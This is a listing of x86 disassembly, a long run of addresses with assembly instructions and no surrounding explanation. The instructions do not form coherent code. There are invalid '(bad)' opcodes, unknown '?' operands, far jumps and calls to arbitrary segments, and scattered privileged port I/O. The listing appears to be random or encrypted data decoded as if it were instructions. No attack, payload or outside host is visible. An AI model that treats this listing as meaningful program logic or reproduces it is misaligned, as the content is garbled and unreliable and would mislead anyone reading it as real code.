  4123e5:	adc    ebx,DWORD PTR [eax]
  4123e7:	addr16 jne 0x412415
  4123ea:	sbb    al,0x46
  4123ec:	dec    ecx
  4123ed:	xchg   ecx,eax
  4123ee:	adc    DWORD PTR [edi+0x43],edx
  4123f1:	test   eax,0xd581cf3b
  4123f6:	inc    ebx
  4123f7:	jns    0x4123c5
  4123f9:	add    BYTE PTR [esi-0x75],ch
  4123fc:	pop    esi
  4123fd:	mov    ds:0x6a55a989,eax
  412402:	out    dx,al
  412403:	les    eax,FWORD PTR [ebx]
  412405:	idiv   BYTE PTR [ecx+0x251149c3]
  41240b:	jno    0x4123ae
  41240d:	(bad)  
  41240e:	or     al,0xa4
  412410:	in     eax,0x12
  412412:	cwde   
  412413:	inc    ecx
  412414:	cmp    DWORD PTR [edi],ebx
  412416:	mov    al,0x0
  412418:	xchg   esp,eax
  412419:	test   DWORD PTR [esi],esp
  41241b:	or     edx,ebx
  41241d:	sahf   
  41241e:	fwait
  41241f:	enter  0x558e,0xa
  412423:	aas    
  412424:	inc    eax
  412425:	scas   al,BYTE PTR es:[edi]
  412426:	aad    0x8c
  412428:	sbb    eax,0x9d533cd9
  41242d:	mov    al,0x1
  41242f:	out    0xc3,eax
  412431:	outs   dx,DWORD PTR ds:[esi]
  412432:	cmp    al,0x31
  412434:	xchg   DWORD PTR [edi],ecx
  412436:	sbb    eax,0x260c3e9b
  41243b:	mov    dh,0x65
  41243d:	xlat   BYTE PTR ds:[ebx]
  41243e:	push   esp
  41243f:	mov    esi,0xab27b277
  412444:	pop    es
  412445:	xchg   ebx,eax
  412446:	ret    0x754d
  412449:	call   0xfca310b3
  41244e:	xlat   BYTE PTR ds:[ebx]
  41244f:	mov    WORD PTR [ebp+0x39],cs
  412452:	mov    eax,ds:0x910891d1
  412457:	push   cs
  412458:	pushf  
  412459:	jmp    0xdc13:0xa5d9971f
  412460:	adc    al,0x4a
  412462:	and    eax,0x9264fada
  412467:	pop    ecx
  412468:	retf   
  412469:	es in  al,dx
  41246b:	cld    
  41246c:	jns    0x412481
  41246e:	gs add eax,0x28e6d8f0
  412474:	pop    edi
  412475:	push   edx
  412476:	fs lahf 
  412478:	in     eax,0x3
  41247a:	jnp    0x41241a
  41247c:	cmp    eax,0xb2f5ee9d
  412481:	bnd jmp 0x784a581d
  412487:	sub    BYTE PTR ds:[eax+eiz*4],al
  41248b:	sub    DWORD PTR [esi+ecx*8-0x5eb65b37],ebx
  412492:	nop
  412493:	(bad)  
  412494:	fistp  DWORD PTR [edi+0x7c803c9a]
  41249a:	inc    ecx
  41249b:	ins    BYTE PTR es:[edi],dx
  41249c:	add    eax,0xc729314a
  4124a1:	jae    0x4124b8
  4124a3:	sbb    dh,BYTE PTR [ebx+0x32366dc2]
  4124a9:	pop    ebp
  4124aa:	rcr    DWORD PTR [edx+0x78],1
  4124ad:	fadd   QWORD PTR [ecx+0x26f558b]
  4124b3:	cld    
  4124b4:	mov    edx,0xdbfc5f9f
  4124b9:	outs   dx,BYTE PTR ds:[esi]
  4124ba:	push   ecx
  4124bb:	mov    dl,0x15
  4124bd:	or     eax,0x570c5e4
  4124c2:	cmp    eax,0x81d7a1a3
  4124c7:	cmp    BYTE PTR [eax],0xb5
  4124ca:	pop    edx
  4124cb:	push   0x6acdca69
  4124d0:	sub    BYTE PTR [ecx+0x28],0x6e
  4124d4:	add    eax,0xc16fcbbe
  4124d9:	add    dh,BYTE PTR [ecx+0x5c046e95]
  4124df:	out    dx,eax
  4124e0:	and    edx,DWORD PTR [eax]
  4124e2:	mov    BYTE PTR [edi],cl
  4124e4:	push   eax
  4124e5:	sub    DWORD PTR [ebx],esp
  4124e7:	mov    eax,0x5b9ac637
  4124ec:	push   ebp
  4124ed:	jl     0x4124fb
  4124ef:	or     dh,bl
  4124f1:	mov    dh,al
  4124f3:	bound  esi,QWORD PTR [esi]
  4124f5:	mov    al,BYTE PTR [eax]
  4124f7:	(bad)  
  4124f8:	or     edi,edi
  4124fa:	sub    al,0x71
  4124fc:	xor    BYTE PTR [ebx*1+0x51d89f30],dh
  412503:	mov    edi,ebx
  412505:	jecxz  0x4124b0
  412507:	pusha  
  412508:	scas   al,BYTE PTR es:[edi]
  412509:	sbb    al,BYTE PTR [edi]
  41250b:	mov    ds:0x23ec585,al
  412510:	xor    eax,edx
  412512:	or     BYTE PTR [ecx+0x23],ch
  412515:	not    DWORD PTR [esi]
  412517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412518:	fild   DWORD PTR [ebp-0x32473551]
  41251e:	push   ecx
  41251f:	jle    0x412589
  412521:	cwde   
  412522:	add    DWORD PTR [edi-0x664e4dea],eax
  412528:	xchg   ebx,eax
  412529:	adc    BYTE PTR [edi-0x3d0b7b80],ch
  41252f:	inc    ebx
  412530:	jmp    0xe80b:0x405a2c7
  412537:	mov    ah,0xa8
  412539:	adc    cl,bh
  41253b:	aas    
  41253c:	(bad)  
  41253d:	xchg   esi,eax
  41253e:	je     0x4124d3
  412540:	xor    DWORD PTR [ebx+eax*2],esp
  412543:	retf   0xca8d
  412546:	jne    0x4124d8
  412548:	int    0xdb
  41254a:	cmp    dh,BYTE PTR [esi+0x32778e19]
  412550:	into   
  412551:	test   eax,0x913e6ff
  412556:	mov    esp,0x11900634
  41255b:	arpl   WORD PTR [eax],cx
  41255d:	ret    0xd74b
  412560:	push   ss
  412561:	jmp    0x412547
  412563:	adc    cl,BYTE PTR [esi+0x14]
  412566:	mul    BYTE PTR [ebx]
  412568:	push   edi
  412569:	and    al,0x3a
  41256b:	scas   eax,DWORD PTR es:[edi]
  41256c:	loope  0x412563
  41256e:	cmp    BYTE PTR [ebp+0x4e2feb67],dl
  412574:	imul   ebp,DWORD PTR [ecx],0x21bd3432
  41257a:	jg     0x4125e3
  41257c:	sub    cl,BYTE PTR ds:0xeaea5084
  412582:	shl    dl,cl
  412584:	adc    dh,BYTE PTR [esi]
  412586:	jae    0x412574
  412588:	sahf   
  412589:	in     al,0x26
  41258b:	xchg   esi,eax
  41258c:	(bad)  
  41258d:	mov    DWORD PTR [edx-0x2d19f9ac],0xae69c4e8
  412597:	stos   BYTE PTR es:[edi],al
  412598:	pop    eax
  412599:	jns    0x412524
  41259b:	ins    DWORD PTR es:[edi],dx
  41259c:	sti    
  41259d:	mov    esi,0x43004378
  4125a2:	mov    WORD PTR ds:0xfa91fde0,ds
  4125a8:	inc    eax
  4125a9:	ds inc esi
  4125ab:	test   al,0xa7
  4125ad:	mov    dh,0xf7
  4125af:	fstp   TBYTE PTR [ecx+edi*2-0x77]
  4125b3:	enter  0xd064,0x81
  4125b7:	inc    esp
  4125b8:	mov    esi,0x1624f724
  4125bd:	icebp  
  4125be:	leave  
  4125bf:	mov    WORD PTR [edi+0x3a],gs
  4125c2:	cmp    DWORD PTR [ebx+0x77],ebx
  4125c5:	cmp    eax,0xe6e1deb4
  4125ca:	aad    0xd0
  4125cc:	adc    DWORD PTR [ebp+0x1d771ee7],0xbc2db739
  4125d6:	repnz and BYTE PTR [ebx-0x3e],cl
  4125da:	and    eax,0x148eb4f8
  4125df:	sbb    BYTE PTR [ebx+0x3d650a2d],bl
  4125e5:	test   BYTE PTR [ebx+0x6ae9507a],dl
  4125eb:	jle    0x412602
  4125ed:	out    0xf4,al
  4125ef:	and    BYTE PTR [esi+0x4f],cl
  4125f2:	lea    esi,[ebp-0x3b]
  4125f5:	xchg   ebp,eax
  4125f6:	cmc    
  4125f7:	inc    esp
  4125f8:	int    0x9d
  4125fa:	fs jmp 0x8abb:0x585808ef
  412602:	jmp    0x5c8edba2
  412607:	jle    0x4125d8
  412609:	retf   
  41260a:	sub    ebp,DWORD PTR [ebp+0x25690c2a]
  412610:	js     0x412603
  412612:	not    DWORD PTR ds:0xc73610ce
  412618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412619:	pop    ecx
  41261a:	adc    BYTE PTR [edx+ecx*1],bl
  41261d:	mov    DWORD PTR [edx-0x72968f4a],eax
  412623:	push   esi
  412624:	xchg   ah,ch
  412626:	lods   eax,DWORD PTR ds:[esi]
  412627:	addr16 inc esp
  412629:	xor    cl,dl
  41262b:	xchg   edi,eax
  41262c:	push   ds
  41262d:	bound  esp,QWORD PTR [eax-0x25e5bdc0]
  412633:	xchg   ebx,eax
  412634:	(bad)  
  412635:	xor    al,0xd
  412637:	call   0xce08:0x9f62eb74
  41263e:	iret   
  41263f:	sub    eax,0xf4136160
  412644:	outs   dx,BYTE PTR ds:[esi]
  412645:	cli    
  412646:	call   0x40c8:0x2600f2c6
  41264d:	and    BYTE PTR [esi+0x7b],dl
  412650:	or     DWORD PTR [eax+0x38],0xffffff9d
  412654:	pusha  
  412655:	out    dx,al
  412656:	mov    ah,0xc6
  412658:	dec    ebx
  412659:	imul   eax,ecx,0xca9e7a3d
  41265f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412660:	loop   0x4126d3
  412662:	lds    esp,FWORD PTR [edi+ebp*2+0x3c538cd3]
  412669:	sub    cl,cl
  41266b:	das    
  41266c:	fs xor eax,0x9690e92a
  412672:	ins    BYTE PTR es:[edi],dx
  412673:	dec    esp
  412674:	imul   BYTE PTR [ecx+0x40cac38c]
  41267a:	push   ecx
  41267b:	sub    eax,0xd414ed27
  412680:	das    
  412681:	adc    ch,dh
  412683:	stc    
  412684:	retf   
  412685:	xor    BYTE PTR [eax],al
  412687:	adc    BYTE PTR [edx-0x20],ah
  41268a:	test   al,0x27
  41268c:	adc    eax,DWORD PTR [edx]
  41268e:	jnp    0x4126ad
  412690:	adc    BYTE PTR [eax+0x4872a37e],ch
  412696:	fs jne 0x412622
  412699:	outs   dx,BYTE PTR ds:[esi]
  41269a:	mov    BYTE PTR [edx-0x61],cl
  41269d:	mov    ebp,esp
  41269f:	aas    
  4126a0:	data16 adc dl,bh
  4126a3:	div    BYTE PTR [ebx-0x381acaac]
  4126a9:	push   es
  4126aa:	cwde   
  4126ab:	xchg   esp,eax
  4126ac:	mov    edx,DWORD PTR [edx]
  4126ae:	sub    al,0xdd
  4126b0:	mov    ebp,0x799b5a74
  4126b5:	push   0xffffff89
  4126b7:	lahf   
  4126b8:	enter  0x509d,0xc2
  4126bc:	das    
  4126bd:	jmp    0xc5a7:0x3a86d908
  4126c4:	jne    0x412709
  4126c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126c7:	inc    ecx
  4126c8:	call   FWORD PTR [eax+0x1c]
  4126cb:	and    edx,DWORD PTR [ecx]
  4126cd:	dec    ebx
  4126ce:	cmp    esi,ebx
  4126d0:	fsubp  st(4),st
  4126d2:	xchg   edx,eax
  4126d3:	loopne 0x412704
  4126d5:	retf   0xe0d8
  4126d8:	dec    edi
  4126d9:	cli    
  4126da:	cs add al,0x98
  4126dd:	or     al,0x7b
  4126df:	pop    fs
  4126e1:	cwde   
  4126e2:	shr    eax,0x1f
  4126e5:	ret    0x83da
  4126e8:	jge    0x4126eb
  4126ea:	pushf  
  4126eb:	pop    edx
  4126ec:	adc    al,0x43
  4126ee:	mov    ds:0xb3c26c97,eax
  4126f3:	(bad)  
  4126f5:	cmp    BYTE PTR [esi],0xd8
  4126f8:	mov    al,0x0
  4126fa:	mov    al,ds:0x347b93c4
  4126ff:	repnz and BYTE PTR [edx+0x88f2060],bl
  412706:	mov    edi,0xd596ef5e
  41270b:	mov    ds,WORD PTR [ecx+0x7b3fc244]
  412711:	int3   
  412712:	in     al,0xd
  412714:	push   cs
  412715:	pushf  
  412716:	bts    DWORD PTR [edx+ecx*4-0x7bb75326],0x21
  41271f:	push   0xffffffd0
  412721:	out    dx,al
  412722:	rcr    BYTE PTR [edi],1
  412724:	and    DWORD PTR [ebp+esi*1-0x3c],esi
  412728:	pop    ds
  412729:	dec    esp
  41272a:	scas   eax,DWORD PTR es:[edi]
  41272b:	mov    ch,0xae
  41272d:	cmp    DWORD PTR [ebp+0x70],ecx
  412730:	repnz pop ss
  412732:	sti    
  412733:	int    0x91
  412735:	push   0x63de02e3
  41273a:	mov    dl,0x4a
  41273c:	mov    al,ds:0x1c44102
  412741:	push   ss
  412742:	fadd   DWORD PTR [ebp-0x7db81a8c]
  412748:	mov    esi,0xd56c1e22
  41274d:	mov    BYTE PTR [esi],al
  41274f:	out    dx,eax
  412750:	xchg   esp,eax
  412751:	cmc    
  412752:	cli    
  412753:	or     BYTE PTR [ebp+0x53],bh
  412756:	(bad)  
  412757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412758:	mov    ch,0x23
  41275a:	add    al,BYTE PTR [edx+edi*2]
  41275d:	inc    ebp
  41275e:	ins    DWORD PTR es:[edi],dx
  41275f:	ror    BYTE PTR [eax],cl
  412761:	(bad)  
  412762:	mov    bl,0xdf
  412764:	mov    dl,0xf9
  412766:	ret    0x132e
  412769:	push   0xffffff97
  41276b:	aam    0x54
  41276d:	pop    ecx
  41276e:	cmp    eax,0x51008a09
  412773:	ins    BYTE PTR es:[edi],dx
  412774:	push   eax
  412775:	loopne 0x4127c3
  412777:	retf   
  412778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412779:	add    edx,DWORD PTR [esi]
  41277b:	loop   0x4127ad
  41277d:	push   edi
  41277e:	popf   
  41277f:	and    DWORD PTR [ecx],edx
  412781:	inc    ecx
  412782:	dec    esp
  412783:	in     eax,0x5f
  412785:	nop
  412786:	dec    ebx
  412787:	sbb    eax,0x9e49deba
  41278c:	or     ebp,esi
  41278e:	xchg   ebp,eax
  41278f:	out    dx,al
  412790:	xor    cl,BYTE PTR [ecx-0x20]
  412793:	or     edi,DWORD PTR [ecx]
  412795:	mov    esp,0x48001b6e
  41279a:	in     al,0x90
  41279c:	dec    ebx
  41279d:	jbe    0x4127b1
  41279f:	fcomp  DWORD PTR [ebx]
  4127a1:	or     ebp,edi
  4127a3:	push   esi
  4127a4:	test   edx,ecx
  4127a6:	jge    0x412752
  4127a8:	jl     0x412749
  4127aa:	fdiv   st,st(6)
  4127ac:	xor    al,0x4d
  4127ae:	stos   BYTE PTR es:[edi],al
  4127af:	clc    
  4127b0:	xchg   esi,eax
  4127b1:	lods   al,BYTE PTR ds:[esi]
  4127b2:	or     BYTE PTR [ecx+ecx*1+0x2efa01dc],ah
  4127b9:	leave  
  4127ba:	add    cl,BYTE PTR [ebx-0x77]
  4127bd:	add    BYTE PTR [edi+0x2de67e8],bh
  4127c3:	push   edx
  4127c4:	scas   al,BYTE PTR es:[edi]
  4127c5:	jge    0x412771
  4127c7:	xor    BYTE PTR [ebx+0x2e],al
  4127ca:	mov    dl,0x78
  4127cc:	pop    esp
  4127cd:	mov    edx,0x7187eb92
  4127d2:	outs   dx,DWORD PTR ds:[esi]
  4127d3:	or     ecx,DWORD PTR [eax+edx*8]
  4127d6:	rol    BYTE PTR [ebp-0x4483d3ff],0x32
  4127dd:	outs   dx,BYTE PTR ds:[esi]
  4127de:	scas   al,BYTE PTR es:[edi]
  4127df:	in     al,dx
  4127e0:	fnsave [ecx-0x14]
  4127e3:	xchg   BYTE PTR [edi],dh
  4127e5:	mov    ?,WORD PTR [eax+0x74edb414]
  4127eb:	imul   ecx,DWORD PTR [ebp-0xd0e1418],0xffffffda
  4127f2:	out    0xc1,eax
  4127f4:	js     0x412832
  4127f6:	mov    eax,ds:0x75a1a0f
  4127fb:	pop    eax
  4127fc:	into   
  4127fd:	xor    eax,0x202fa439
  412802:	jmp    0x41278a
  412804:	jmp    0x83bbd904
  412809:	dec    ebp
  41280a:	pop    esi
  41280b:	jge    0x412821
  41280d:	push   ss
  41280e:	sbb    al,BYTE PTR [eax+0x11531890]
  412814:	cli    
  412815:	ret    
  412816:	add    cl,BYTE PTR [esi-0x7eda14e0]
  41281c:	pop    eax
  41281d:	pop    es
  41281e:	xor    DWORD PTR [esi],ebp
  412820:	aad    0xfe
  412822:	sbb    al,0x41
  412824:	mov    ecx,0xb435c508
  412829:	shr    DWORD PTR [ecx],1
  41282b:	in     al,dx
  41282c:	jmp    0x412833
  41282e:	aas    
  41282f:	add    DWORD PTR [eax+esi*1],ecx
  412832:	icebp  
  412833:	hlt    
  412834:	dec    edi
  412835:	(bad)  
  412837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412838:	adc    BYTE PTR [ebx+eiz*8],dh
  41283b:	xchg   ebx,eax
  41283c:	push   0xae7aa390
  412841:	enter  0xed27,0xfd
  412845:	push   esi
  412846:	test   eax,0xa00df9b1
  41284b:	addr16 mov bh,0x8d
  41284e:	push   esi
  41284f:	xor    al,0xe4
  412851:	xchg   bh,bl
  412853:	xchg   edx,eax
  412854:	inc    esi
  412855:	adc    al,al
  412857:	push   esp
  412858:	inc    ebx
  412859:	dec    ebx
  41285a:	lahf   
  41285b:	xlat   BYTE PTR ds:[ebx]
  41285c:	repz imul ebp,DWORD PTR [esi+0xf1cd2e4],0x91975060
  412867:	mov    eax,0x8a3a9fc3
  41286c:	pop    ds
  41286d:	xor    eax,DWORD PTR [edx+esi*8]
  412870:	push   esi
  412871:	cmp    eax,0xfa5d7470
  412876:	dec    ecx
  412877:	pop    esp
  412878:	inc    esp
  412879:	mov    al,0x96
  41287b:	inc    ebp
  41287c:	inc    ebp
  41287d:	inc    ebx
  41287e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41287f:	repz pop ebx
  412881:	popa   
  412882:	mov    bh,0xe2
  412884:	jns    0x41283f
  412886:	in     al,0xc5
  412888:	daa    
  412889:	in     eax,0xd6
  41288b:	out    0xf,eax
  41288d:	xchg   ecx,eax
  41288e:	and    eax,0xfe8cfe20
  412893:	lea    edx,[ebx+ebp*1-0x315e2bd2]
  41289a:	xchg   BYTE PTR [eax+0x79],ch
  41289d:	idiv   BYTE PTR [esi-0x24f0b551]
  4128a3:	cli    
  4128a4:	push   ds
  4128a5:	adc    edi,ecx
  4128a7:	out    0x26,al
  4128a9:	je     0x412913
  4128ab:	adc    al,0x26
  4128ad:	and    edi,DWORD PTR [edi]
  4128af:	cmp    al,0xd9
  4128b1:	sbb    BYTE PTR [edx],dh
  4128b3:	iret   
  4128b4:	xchg   ebp,eax
  4128b5:	iret   
  4128b6:	mov    BYTE PTR [esi+0x16b7e94],dl
  4128bc:	das    
  4128bd:	xor    al,0x83
  4128bf:	ret    0xfe7a
  4128c2:	in     eax,0xda
  4128c4:	jmp    0x7a8c:0xe056732c
  4128cb:	pop    edx
  4128cc:	jecxz  0x41290f
  4128ce:	mov    ecx,0x64d04950
  4128d3:	push   edx
  4128d4:	xchg   esp,eax
  4128d5:	sbb    cl,BYTE PTR [ecx+0x61cc406c]
  4128db:	sbb    DWORD PTR [ebx-0xa],edx
  4128de:	repz shl bl,0x49
  4128e2:	ins    BYTE PTR es:[edi],dx
  4128e3:	xor    ecx,DWORD PTR [esi-0x4e]
  4128e6:	es jne 0x41292b
  4128e9:	pop    es
  4128ea:	test   eax,0x938b53d8
  4128ef:	call   0x21badbf6
  4128f4:	test   esp,ecx
  4128f6:	aaa    
  4128f7:	in     al,0xaa
  4128f9:	dec    esp
  4128fa:	loop   0x4128c1
  4128fc:	sub    ch,BYTE PTR cs:[eax]
  4128ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412900:	repz jne 0x412925
  412903:	sub    al,0xe9
  412905:	add    al,0x5e
  412907:	jp     0x41289f
  412909:	sbb    BYTE PTR [esp+edx*1-0x69],0x14
  41290e:	sub    cl,BYTE PTR ds:0xccd79dc1
  412914:	sbb    DWORD PTR [ecx+edx*8-0x41551004],ecx
  41291b:	mov    ah,0x57
  41291d:	int3   
  41291e:	cdq    
  41291f:	js     0x41290a
  412921:	or     eax,ecx
  412923:	or     bh,BYTE PTR [eax+0x23cd93b7]
  412929:	add    al,0x76
  41292b:	loope  0x4128ed
  41292d:	xor    esp,DWORD PTR [eax]
  41292f:	in     eax,0xae
  412931:	das    
  412932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412933:	out    0xa5,al
  412935:	adc    ah,BYTE PTR [ebx]
  412937:	shl    DWORD PTR [edx-0x3c],0xa2
  41293b:	addr16 lahf 
  41293d:	and    BYTE PTR [ebp-0x3a],bl
  412940:	mov    cl,0x4a
  412942:	pop    ebp
  412943:	ror    ebx,cl
  412945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412946:	repnz popa 
  412948:	sar    DWORD PTR [ecx+0x2a1a4fa6],1
  41294e:	sbb    ch,BYTE PTR [edx-0x18c21175]
  412954:	fwait
  412955:	stc    
  412956:	inc    esp
  412957:	mov    eax,0x41d2bc19
  41295c:	lea    edi,[ecx]
  41295e:	cmp    al,BYTE PTR [eax]
  412960:	ja     0x412964
  412962:	repnz fsub st(2),st
  412965:	mov    dh,0x10
  412967:	push   edi
  412968:	pop    edx
  412969:	rol    dh,cl
  41296b:	inc    eax
  41296c:	xchg   ebx,eax
  41296d:	mov    ecx,0xbafa757
  412972:	in     eax,0x24
  412974:	test   BYTE PTR [edx],bl
  412976:	je     0x4129d1
  412978:	imul   edi,DWORD PTR [ebp+0x2a],0x53106775
  41297f:	outs   dx,BYTE PTR ds:[esi]
  412980:	push   ss
  412981:	jge    0x41295a
  412983:	adc    BYTE PTR [edx],0xd7
  412986:	inc    esp
  412987:	cld    
  412988:	leave  
  412989:	jmp    0x427a50dd
  41298e:	xor    eax,0xe505ca2f
  412993:	push   edi
  412994:	jecxz  0x412a12
  412996:	ret    
  412997:	dec    esp
  412998:	mov    ch,0x1
  41299a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41299b:	stos   DWORD PTR es:[edi],eax
  41299c:	into   
  41299d:	xchg   esi,eax
  41299e:	aas    
  41299f:	adc    ebx,DWORD PTR [esi]
  4129a1:	aas    
  4129a2:	hlt    
  4129a3:	rol    BYTE PTR [eax],1
  4129a5:	pop    ss
  4129a6:	cmp    BYTE PTR [eax-0x3c],dl
  4129a9:	push   edi
  4129aa:	sbb    DWORD PTR [ebp-0x7a],esp
  4129ad:	dec    esp
  4129ae:	sbb    bl,BYTE PTR [esi]
  4129b0:	push   0x7843ca3d
  4129b5:	cdq    
  4129b6:	dec    ebp
  4129b7:	push   esp
  4129b8:	ja     0x4129a5
  4129ba:	cmp    eax,0xa569f766
  4129bf:	and    edx,ebx
  4129c1:	mov    ds:0x97a422ff,eax
  4129c6:	xchg   edi,eax
  4129c8:	enter  0x4c3d,0xb8
  4129cc:	out    0x9f,eax
  4129ce:	(bad)  
  4129cf:	gs enter 0xaf4c,0xbd
  4129d4:	push   edx
  4129d5:	mov    BYTE PTR [eax+edx*8+0x62],0x60
  4129da:	mov    ch,0xd7
  4129dc:	inc    BYTE PTR [ebx-0xce98fad]
  4129e2:	cdq    
  4129e3:	and    ch,0x97
  4129e6:	mov    al,ds:0x73dbf80c
  4129eb:	adc    DWORD PTR [esi],ecx
  4129ed:	mov    dl,0xbb
  4129ef:	xlat   BYTE PTR ds:[ebx]
  4129f0:	fiadd  WORD PTR [edi]
  4129f2:	mov    al,al
  4129f4:	dec    esi
  4129f5:	cwde   
  4129f6:	test   eax,0x580cfca0
  4129fb:	pusha  
  4129fc:	dec    ebx
  4129fd:	sbb    eax,0xbce9b513
  412a02:	xor    cl,BYTE PTR [ebx]
  412a04:	pop    ebx
  412a05:	ret    
  412a06:	pop    esp
  412a07:	repz xchg esp,eax
  412a09:	adc    BYTE PTR [ecx],bh
  412a0b:	add    ebx,0x15
  412a0e:	jmp    0x412a5d
  412a10:	rcl    BYTE PTR [edx+0x4cdee3f2],1
  412a16:	pop    esi
  412a17:	cmp    DWORD PTR [esp+esi*1+0x17340c2a],ebp
  412a1e:	sub    eax,0x44d224de
  412a23:	inc    ecx
  412a24:	adc    esi,DWORD PTR cs:[edx+ebp*8]
  412a28:	xchg   BYTE PTR [ebx+ebp*2],dh
  412a2b:	push   ebp
  412a2c:	stos   BYTE PTR es:[edi],al
  412a2d:	xlat   BYTE PTR ds:[ebx]
  412a2e:	test   eax,0x2cf85062
  412a33:	sbb    esi,ecx
  412a35:	out    0xea,al
  412a37:	scas   eax,DWORD PTR es:[edi]
  412a38:	das    
  412a39:	rcr    BYTE PTR [esi+0x6709a848],0x93
  412a40:	jg     0x412a3a
  412a42:	(bad)  
  412a43:	hlt    
  412a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a45:	lea    edi,[edx]
  412a47:	data16 or dl,BYTE PTR [ebp+0x2b22e6f8]
  412a4e:	enter  0x2b77,0x12
  412a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a53:	imul   ebx,esi,0xae83271d
  412a59:	lea    esi,[esi+0x2665939a]
  412a5f:	jae    0x412acd
  412a61:	pushf  
  412a62:	mov    ?,WORD PTR [ecx+0x7866459]
  412a68:	clc    
  412a69:	pop    ecx
  412a6a:	xor    eax,0xea6cdcb9
  412a6f:	push   ds
  412a70:	out    0xf6,al
  412a72:	jmp    0x412a7e
  412a74:	mov    ds:0xadfa205f,al
  412a79:	inc    ebx
  412a7a:	stos   BYTE PTR es:[edi],al
  412a7b:	sbb    eax,0x2a9560ba
  412a80:	pop    ss
  412a81:	push   ecx
  412a82:	mov    esp,0xfa1345ff
  412a87:	in     eax,0xc2
  412a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a8a:	pop    esi
  412a8b:	jecxz  0x412a80
  412a8d:	loope  0x412a1f
  412a8f:	adc    DWORD PTR [eax+0x652d085a],ebx
  412a95:	inc    ebx
  412a96:	adc    BYTE PTR [ecx],ah
  412a98:	loop   0x412ad2
  412a9a:	mov    al,0x8b
  412a9c:	sbb    BYTE PTR ds:0x778e8f20,dh
  412aa2:	leave  
  412aa3:	adc    BYTE PTR [edi-0x34],bl
  412aa6:	in     eax,0xc6
  412aa8:	xor    al,0x5e
  412aaa:	add    al,0xdb
  412aac:	clc    
  412aad:	xchg   edx,eax
  412aae:	push   edi
  412aaf:	loope  0x412ae9
  412ab1:	mov    ds:0xeb4d07cd,eax
  412ab6:	mov    ?,WORD PTR [ebx-0x79866891]
  412abc:	push   ebp
  412abd:	daa    
  412abe:	out    dx,eax
  412abf:	fiadd  DWORD PTR [ebp-0x2fa5fb2e]
  412ac5:	push   ss
  412ac6:	scas   al,BYTE PTR es:[edi]
  412ac7:	icebp  
  412ac8:	inc    esi
  412ac9:	add    DWORD PTR [esi],edi
  412acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412acc:	fst    DWORD PTR [eax]
  412ace:	xchg   esi,eax
  412acf:	iret   
  412ad0:	pop    ds
  412ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ad2:	mov    ch,0xd8
  412ad4:	mov    dh,0x44
  412ad6:	sbb    al,0xb3
  412ad8:	jns    0x412aed
  412ada:	dec    edi
  412adb:	sar    DWORD PTR [esi-0x6],1
  412ade:	dec    ecx
  412adf:	jp     0x412b0c
  412ae1:	add    edx,esp
  412ae3:	data16 mov BYTE PTR [edi],0xf8
  412ae7:	(bad)  
  412ae8:	inc    ebp
  412ae9:	dec    eax
  412aea:	mov    edx,0x3e2832d4
  412aef:	pushf  
  412af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412af1:	jae    0x4fd0cd12
  412af7:	xor    edx,DWORD PTR [eax]
  412af9:	xchg   ebp,eax
  412afa:	mov    ds:0xe11e72c2,eax
  412aff:	cwde   
  412b00:	jge    0x412b60
  412b02:	fisub  DWORD PTR [esi+0xa]
  412b05:	fwait
  412b06:	popa   
  412b07:	imul   ecx,DWORD PTR [ebx],0xfffffff0
  412b0a:	add    al,0xc6
  412b0c:	popf   
  412b0d:	es dec esp
  412b0f:	pop    ds
  412b10:	pop    esp
  412b11:	repz sahf 
  412b13:	mov    esp,0xc388a0d3
  412b18:	in     al,0x2e
  412b1a:	shl    DWORD PTR [ebx-0x33],1
  412b1d:	stos   DWORD PTR es:[edi],eax
  412b1e:	mov    ch,0x9d
  412b20:	push   0x6a
  412b22:	push   edx
  412b23:	and    eax,0x235a6808
  412b28:	mov    edx,0x79431c6
  412b2d:	test   eax,0xfbe072d3
  412b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b33:	bound  eax,QWORD PTR [eax+0x20]
  412b36:	aad    0xc0
  412b38:	and    edx,esp
  412b3a:	add    ebx,ebp
  412b3c:	loopne 0x412b41
  412b3e:	(bad)  
  412b3f:	cdq    
  412b40:	mov    ecx,0x1ae28edb
  412b45:	dec    esp
  412b46:	call   FWORD PTR ds:0x894e1830
  412b4c:	cli    
  412b4d:	int3   
  412b4e:	or     dl,dl
  412b50:	mov    bh,BYTE PTR [ecx+ebp*8-0x4]
  412b54:	bound  ecx,QWORD PTR [ebp-0x5e]
  412b57:	call   0x4884:0xff435c3e
  412b5e:	out    0x35,eax
  412b60:	(bad)  
  412b61:	lods   al,BYTE PTR ds:[esi]
  412b62:	adc    bh,BYTE PTR [eax]
  412b64:	sbb    DWORD PTR [ecx-0x7f8fa77e],eax
  412b6a:	xlat   BYTE PTR ds:[ebx]
  412b6b:	pop    edx
  412b6c:	push   edi
  412b6d:	or     esp,ecx
  412b6f:	xchg   edx,eax
  412b70:	xchg   edx,eax
  412b71:	sbb    esp,DWORD PTR [eax+edi*1-0x8f22966]
  412b78:	xchg   ecx,ebx
  412b7a:	in     al,0x98
  412b7c:	push   cs
  412b7d:	dec    ebx
  412b7e:	mov    gs,WORD PTR [ebp+0x772e7dc3]
  412b84:	mov    DWORD PTR [ecx],esi
  412b86:	fdivr  st,st(3)
  412b88:	fisttp WORD PTR [edi]
  412b8a:	xchg   BYTE PTR [edi+0x66e31a4f],al
  412b90:	adc    eax,0x4a1552da
  412b95:	jmp    0x45e20106
